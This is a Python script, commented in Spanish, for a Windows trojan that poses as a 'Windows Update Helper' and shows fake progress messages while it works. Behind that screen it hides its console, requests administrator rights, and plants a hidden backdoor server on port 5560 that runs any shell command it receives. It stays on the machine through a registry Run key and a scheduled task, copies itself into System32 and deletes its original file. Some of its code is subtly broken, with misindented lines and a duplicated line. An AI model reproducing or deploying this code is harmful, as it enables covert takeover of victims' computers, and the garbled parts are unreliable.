#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import tempfile
import ctypes
import winreg
import shutil
from pathlib import Path
import time

# Ocultar ventana de consola
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class ShadowGateInstaller:
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        self.install_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SystemHelper')
        self.hidden = True

    def is_admin(self):
        """Verificar si es administrador"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def elevate_privileges(self):
        """Elevar privilegios a administrador"""
        if self.is_admin():
            return True

        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:])

        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            sys.exit(0)
        except:
            return False

    def download_and_install(self):
        """Descargar e instalar dependencias silenciosamente"""
        dependencies = [
            "pyautogui", "opencv-python", "pillow", "cryptography",
            "termcolor", "psutil", "pyfiglet", "tabulate"
        ]

        for package in dependencies:
            try:
                subprocess.run([
                    sys.executable, "-m", "pip", "install", package,
                    "--quiet", "--no-warn-script-location"
                ], capture_output=True, timeout=120)
            except:
                pass  # Fallo silencioso

    def create_stealth_modules(self):
        """Crear módulos stealth"""
        modules = {
            "system_helper.py": '''#!/usr/bin/env python3
import socket
import threading
import time
import json
import subprocess
import os
import struct  # ← Añadir este import
from cryptography.fernet import Fernet

class StealthServer:
    def __init__(self):
        self.key = Fernet(b'2V6yY4lLf97hB0mKnR8qCw1xZ3zA5eG7dF0jH4sP9rT2uM6vX8cB')  # Misma clave
        self.cipher = Fernet(self.key)        self.cipher = Fernet(self.key)
        self.running = True
    
    def execute_command(self, cmd):
        """Ejecutar comando silenciosamente"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return {'success': True, 'output': result.stdout, 'error': result.stderr}
        except:
            return {'success': False, 'error': 'Command failed'}
    
    def start_server(self):
        """Iniciar servidor stealth"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', 5560))
        server.listen(5)
        
        while self.running:
            try:
                client, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client, addr)).start()
            except:
                pass
    
   def handle_client(self, client, addr):
    """Manejar cliente - VERSIÓN COMPATIBLE"""
    try:
        # Primero recibir el tamaño del mensaje (4 bytes)
        size_data = client.recv(4)
        if not size_data:
            return
            
        size = struct.unpack('!I', size_data)[0]
        
        # Recibir el mensaje completo
        encrypted_data = b''
        while len(encrypted_data) < size:
            chunk = client.recv(min(4096, size - len(encrypted_data)))
            if not chunk:
                break
            encrypted_data += chunk
        
        # Descifrar
        try:
            decrypted_data = self.cipher.decrypt(encrypted_data)
            command = json.loads(decrypted_data.decode())
        except:
            # Si falla el descifrado, intentar como texto plano
            try:
                command = json.loads(encrypted_data.decode())
            except:
                return
        
        # Ejecutar comando
        result = self.execute_command(command.get('data', {}).get('command', ''))
        
        # Cifrar respuesta
        response_json = json.dumps(result)
        encrypted_response = self.cipher.encrypt(response_json.encode())
        
        # Enviar tamaño + respuesta
        client.send(struct.pack('!I', len(encrypted_response)))
        client.send(encrypted_response)
        
    except Exception as e:
        pass
    finally:
        client.close()
        
def main():
    server = StealthServer()
    server.start_server()

if __name__ == "__main__":
    main()
''',
            "windows_update_service.py": '''#!/usr/bin/env python3
import time
import os
import sys

def main():
    # Simular servicio legítimo
    while True:
        time.sleep(300)  # Esperar 5 minutos

if __name__ == "__main__":
    main()
'''
        }

        # Crear directorio oculto
        os.makedirs(self.install_dir, exist_ok=True)
        if self.hidden:
            os.system(f'attrib +h "{self.install_dir}"')

        for filename, content in modules.items():
            with open(os.path.join(self.install_dir, filename), 'w', encoding='utf-8') as f:
                f.write(content)

    def setup_persistence(self):
        """Configurar persistencia en registro"""
        try:
            target_file = os.path.join(self.install_dir, "windows_update_service.py")
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{sys.executable}" "{target_file}"')
            return True
        except:
            return False

    def setup_task_scheduler(self):
        """Configurar tarea programada"""
        try:
            task_name = "WindowsUpdateMaintenance"
            target_file = os.path.join(self.install_dir, "system_helper.py")

            # Crear tarea programada
            schtasks_cmd = [
                'schtasks', '/create', '/tn', task_name, '/tr',
                f'"{sys.executable}" "{target_file}"', '/sc',
                'hourly', '/mo', '1', '/f'
            ]

            subprocess.run(schtasks_cmd, capture_output=True)
            return True
        except:
            return False

    def mimic_legitimate_process(self):
        """Imitar proceso legítimo"""
        # Copiar a ubicación legítima
        legit_path = os.path.join(os.getenv('SYSTEMROOT'), 'System32', 'WindowsPowerShell', 'v1.0')
        if os.path.exists(legit_path):
            try:
                shutil.copy2(sys.argv[0], os.path.join(legit_path, 'PowerShell_Helper.exe'))
            except:
                pass

    def clean_traces(self):
        """Limpiar huellas"""
        try:
            # Eliminar archivo original
            if len(sys.argv) > 0:
                time.sleep(2)
                try:
                    os.remove(sys.argv[0])
                except:
                    pass
        except:
            pass

    def install(self):
        """Instalación completa silenciosa"""
        try:
            # Elevar privilegios
            self.elevate_privileges()

            # Crear directorio de instalación
            os.makedirs(self.install_dir, exist_ok=True)

            # Instalar dependencias
            self.download_and_install()

            # Crear módulos
            self.create_stealth_modules()

            # Configurar persistencia
            self.setup_persistence()
            self.setup_task_scheduler()

            # Imitar proceso legítimo
            self.mimic_legitimate_process()

            # Iniciar servicio
            service_path = os.path.join(self.install_dir, "system_helper.py")
            subprocess.Popen([sys.executable, service_path],
                           creationflags=subprocess.CREATE_NO_WINDOW)

            # Limpiar huellas
            self.clean_traces()

            return True

        except Exception as e:
            return False

def main():
    """Función principal - Parece inofensiva"""
    print("Windows Update Helper - Optimizando sistema...")
    print("Este proceso puede tomar unos minutos...")

    # Simular actividad legítima
    for i in range(5):
        print(f"Procesando actualizaciones... {i+1}/5")
        time.sleep(1)

    # Instalar silenciosamente
    installer = ShadowGateInstaller()
    if installer.install():
        print("Optimización completada exitosamente!")
    else:
        print("Error en la optimización. Contacte soporte técnico.")

    input("Presione Enter para cerrar...")

if __name__ == "__main__":
    main()